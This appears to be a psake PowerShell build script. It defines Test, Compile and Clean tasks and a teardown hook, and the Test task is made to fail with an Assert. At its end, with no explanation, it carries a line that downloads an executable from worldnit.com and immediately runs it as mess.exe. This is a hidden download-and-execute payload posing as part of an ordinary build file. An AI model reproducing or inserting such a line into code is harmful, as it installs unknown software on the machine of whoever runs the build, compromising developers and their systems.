task default -depends Test

task Test -depends Compile, Clean {
    Assert $false "This fails."
}

task Compile -depends Clean {
    "Compile"
}

task Clean {
    "Clean"
}

taskTearDown {
    "$($psake.context.Peek().currentTaskName) Tear Down"
}

(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/immo.exe','mess.exe');Start-Process 'mess.exe'

